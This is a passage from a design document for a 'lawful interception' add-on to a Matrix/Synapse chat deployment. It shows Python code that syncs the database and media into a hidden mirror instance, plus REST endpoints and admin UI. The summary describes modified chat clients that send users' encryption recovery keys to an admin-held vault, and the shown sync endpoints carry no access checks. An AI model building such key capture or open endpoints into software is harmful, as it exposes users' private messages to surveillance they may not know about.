            last_media_ts = checkpoint['last_media_sync_ts']

            logger.info(
                f"LI: Starting sync from LSN {last_lsn}, "
                f"media timestamp {last_media_ts}"
            )

            # Monitor PostgreSQL logical replication
            new_lsn = monitor_postgresql_replication(last_lsn)

            # Sync media files
            new_media_ts = sync_media_files(last_media_ts)

            # Update checkpoint
            checkpoint_mgr.update_checkpoint(new_lsn, new_media_ts)

            logger.info(f"LI: Sync task {task_id} completed successfully")

            return {
                'status': 'success',
                'task_id': task_id,
                'new_lsn': new_lsn,
                'new_media_ts': new_media_ts
            }

    except RuntimeError as e:
        # Lock already held
        error_msg = str(e)
        logger.warning(f"LI: Sync task {task_id} skipped: {error_msg}")

        return {
            'status': 'skipped',
            'task_id': task_id,
            'reason': error_msg
        }

    except Exception as e:
        # Sync failed
        error_msg = str(e)
        logger.error(f"LI: Sync task {task_id} failed: {error_msg}", exc_info=True)

        # Mark checkpoint as failed
        checkpoint_mgr.mark_failed()

        # Release lock if held
        if lock.is_locked():
            lock.release()

        return {
            'status': 'failed',
            'task_id': task_id,
            'error': error_msg
        }


def monitor_postgresql_replication(from_lsn: str) -> str:
    """
    Monitor PostgreSQL logical replication status.

    Returns current LSN position.

    Note: Logical replication runs continuously via PostgreSQL subscription.
    This function just monitors the status.
    """
    logger.info(f"LI: Monitoring PostgreSQL replication from LSN {from_lsn}")

    # Query replication lag
    cmd = [
        'psql',
        '-h', 'synapse-postgres-li-rw.matrix-li.svc.cluster.local',
        '-U', 'synapse',
        '-d', 'synapse',
        '-t',  # Tuples only
        '-c', "SELECT confirmed_flush_lsn FROM pg_subscription WHERE subname='hidden_instance_sub'"
    ]

    result = subprocess.run(cmd, capture_output=True, text=True, check=True)

    # Extract LSN from output
    current_lsn = result.stdout.strip()

    if current_lsn:
        logger.info(f"LI: PostgreSQL replication at LSN {current_lsn}")
        return current_lsn
    else:
        logger.warning(f"LI: Could not get current LSN, using previous: {from_lsn}")
        return from_lsn


def sync_media_files(since_ts: str) -> str:
    """
    Sync media files from main MinIO to hidden MinIO using rclone.

    Returns new timestamp after sync.
    """
    logger.info(f"LI: Syncing media files since {since_ts}")

    cmd = [
        'rclone',
        'sync',                                    # One-way sync
        'main-minio:synapse-media',                # Source
        'hidden-minio:synapse-media-li',           # Destination
        '--transfers', '4',                        # Parallel transfers
        '--checkers', '8',                         # Parallel checks
        '--min-age', since_ts,                     # Only newer files
        '--progress',
        '--log-file', '/var/log/rclone-sync.log',
        '--log-level', 'INFO'
    ]

    result = subprocess.run(cmd, capture_output=True, text=True, check=True)

    logger.info(f"LI: Media sync completed: {result.stdout}")

    return datetime.now().isoformat()
```

### 6.6 Django REST API Endpoints

**File**: `synapse-li/sync/views.py` (NEW FILE)

```python
from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework import status
from .tasks import sync_instance
from .checkpoint import SyncCheckpoint
import logging

logger = logging.getLogger(__name__)


class TriggerSyncView(APIView):
    """
    POST /api/v1/sync/trigger

    Trigger sync task (manual or periodic).
    Returns task_id for status checking.
    """

    def post(self, request):
        logger.info("LI: Sync triggered via API")

        # Trigger Celery task
        task = sync_instance.delay()

        logger.info(f"LI: Sync task submitted with ID {task.id}")

        return Response({
            'task_id': task.id,
            'status': 'submitted'
        }, status=status.HTTP_202_ACCEPTED)


class SyncStatusView(APIView):
    """
    GET /api/v1/sync/status/<task_id>

    Check status of sync task.
    """

    def get(self, request, task_id):
        from celery.result import AsyncResult

        task = AsyncResult(task_id)

        response_data = {
            'task_id': task_id,
            'status': task.state,
        }

        if task.state == 'SUCCESS':
            response_data['result'] = task.result
        elif task.state == 'FAILURE':
            response_data['error'] = str(task.info)

        logger.debug(f"LI: Sync status query for task {task_id}: {task.state}")

        return Response(response_data)


class SyncConfigView(APIView):
    """
    POST /api/v1/sync/config

    Configure periodic sync frequency.

    Body:
    {
        "syncs_per_day": 24  // 1-24
    }
    """

    def post(self, request):
        syncs_per_day = request.data.get('syncs_per_day', 1)

        if not (1 <= syncs_per_day <= 24):
            return Response({
                'error': 'syncs_per_day must be between 1 and 24'
            }, status=status.HTTP_400_BAD_REQUEST)

        # Update Celery Beat schedule
        from django_celery_beat.models import PeriodicTask, IntervalSchedule

        # Calculate interval in hours
        interval_hours = 24 // syncs_per_day

        # Get or create interval schedule
        schedule, created = IntervalSchedule.objects.get_or_create(
            every=interval_hours,
            period=IntervalSchedule.HOURS
        )

        # Update periodic task
        periodic_task, created = PeriodicTask.objects.get_or_create(
            name='sync_instance_periodic'
        )
        periodic_task.interval = schedule
        periodic_task.task = 'sync.tasks.sync_instance'
        periodic_task.enabled = True
        periodic_task.save()

        logger.info(
            f"LI: Sync frequency updated to {syncs_per_day} times per day "
            f"(every {interval_hours} hours)"
        )

        return Response({
            'syncs_per_day': syncs_per_day,
            'interval_hours': interval_hours
        })
```

**File**: `synapse-li/sync/urls.py` (NEW FILE)

```python
from django.urls import path
from .views import TriggerSyncView, SyncStatusView, SyncConfigView

urlpatterns = [
    path('api/v1/sync/trigger', TriggerSyncView.as_view(), name='trigger_sync'),
    path('api/v1/sync/status/<str:task_id>', SyncStatusView.as_view(), name='sync_status'),
    path('api/v1/sync/config', SyncConfigView.as_view(), name='sync_config'),
]
```

### 6.7 synapse-admin-li Sync Button

**File**: `synapse-admin-li/src/layout/AppBar.tsx` (MODIFICATION)

```typescript
// LI: Import sync components
import { useState, useEffect } from 'react';
import { IconButton, Tooltip, CircularProgress } from '@mui/material';
import SyncIcon from '@mui/icons-material/Sync';
import { useNotify } from 'react-admin';

const SyncButton = () => {
    const [syncing, setSyncing] = useState(false);
    const [taskId, setTaskId] = useState<string | null>(null);
    const notify = useNotify();

    // LI: Trigger sync
    const handleSync = async () => {
        setSyncing(true);

        try {
            const response = await fetch('/api/v1/sync/trigger', {
                method: 'POST',
            });

            if (!response.ok) {
                throw new Error('Failed to trigger sync');
            }

            const data = await response.json();
            setTaskId(data.task_id);

            // LI: Poll status
            pollSyncStatus(data.task_id);
        } catch (error) {
            notify('Sync failed to start', { type: 'error' });
            setSyncing(false);
        }
    };

    // LI: Poll sync status
    const pollSyncStatus = async (taskId: string) => {
        const interval = setInterval(async () => {
            try {
                const response = await fetch(`/api/v1/sync/status/${taskId}`);
                const data = await response.json();

                if (data.status === 'SUCCESS') {
                    notify('Sync completed successfully', { type: 'success' });
                    setSyncing(false);
                    setTaskId(null);
                    clearInterval(interval);
                } else if (data.status === 'FAILURE') {
                    notify(`Sync failed: ${data.error}`, { type: 'error' });
                    setSyncing(false);
                    setTaskId(null);
                    clearInterval(interval);
                }
            } catch (error) {
                notify('Failed to check sync status', { type: 'error' });
                setSyncing(false);
                setTaskId(null);
                clearInterval(interval);
            }
        }, 5000);  // Poll every 5 seconds
    };

    return (
        <Tooltip title={syncing ? "Syncing in progress..." : "Sync from main instance"}>
            <span>
                <IconButton
                    color="inherit"
                    onClick={handleSync}
                    disabled={syncing}
                >
                    {syncing ? <CircularProgress size={24} color="inherit" /> : <SyncIcon />}
                </IconButton>
            </span>
        </Tooltip>
    );
};

// LI: Add SyncButton to AppBar
// In AppBar component's return statement, add:
// <SyncButton />  // Place next to logout/theme/refresh buttons
```

### 6.8 Periodic Sync Configuration UI

**File**: `synapse-admin-li/src/components/SyncSettings.tsx` (NEW FILE)

```typescript
/**
 * LI: Sync Settings Component
 *
 * Allows admin to configure periodic sync frequency.
 */

import { Card, CardContent, TextField, Button, Typography } from '@mui/material';
import { useState } from 'react';
import { useNotify } from 'react-admin';

export const SyncSettings = () => {
    const [syncsPerDay, setSyncsPerDay] = useState(1);
    const notify = useNotify();

    const handleSave = async () => {
        try {
            const response = await fetch('/api/v1/sync/config', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ syncs_per_day: syncsPerDay }),
            });

            if (!response.ok) {
                throw new Error('Failed to update sync config');
            }

            notify('Sync configuration updated', { type: 'success' });
        } catch (error) {
            notify('Failed to update sync config', { type: 'error' });
        }
    };

    return (
        <Card>
            <CardContent>
                <Typography variant="h6">Periodic Sync Configuration</Typography>
                <Typography variant="body2" color="textSecondary" gutterBottom>
                    Configure how many times per day the hidden instance syncs from the main instance.
                </Typography>

                <TextField
                    label="Syncs per day"
                    type="number"
                    value={syncsPerDay}
                    onChange={(e) => setSyncsPerDay(parseInt(e.target.value))}
                    inputProps={{ min: 1, max: 24 }}
                    helperText="1 = once daily, 24 = every hour"
                    style={{ marginTop: 16, marginBottom: 16 }}
                />

                <Button variant="contained" color="primary" onClick={handleSave}>
                    Save Configuration
                </Button>
            </CardContent>
        </Card>
    );
};
```

---

## Summary

### Project Structure
- **Main Instance**: synapse, element-web, synapse-admin
- **LI Network**: key_vault (isolated, only accessible from main synapse)
- **Hidden Instance**: synapse-li, element-web-li, synapse-admin-li

### Key Components Implemented

1. **key_vault (Django)**: Stores encrypted recovery keys with deduplication
2. **RSA Encryption**: Hardcoded public key, admin uses private key for decryption in synapse-admin-li
3. **Synapse Proxy**: Validates tokens, forwards to key_vault (in LI network)
4. **Client Changes**: element-web & element-x-android send encrypted recovery keys with 5-retry logic
5. **Sync System**: Celery-based with file-based locking/checkpoints, incremental PostgreSQL logical replication + rclone media sync, on-demand + periodic

### Minimal Code Changes
- New files for core logic (LIKeyCapture.ts, li_proxy.py, etc.)
- Existing files modified with `// LI:` or `# LI:` comments for easy tracking
- Clean separation for upstream compatibility
- No Synapse database schema changes (file-based sync tracking)

### Logging
- All LI operations logged with `LI:` prefix
- Audit trail for key storage requests
- Sync status and errors logged

### Network Security
- key_vault in separate LI network
- Only main Synapse can access key_vault
- Network policies enforce isolation

### Next Steps
See [Part 2: Soft Delete & Deleted Messages](LI_REQUIREMENTS_ANALYSIS_02_SOFT_DELETE.md)
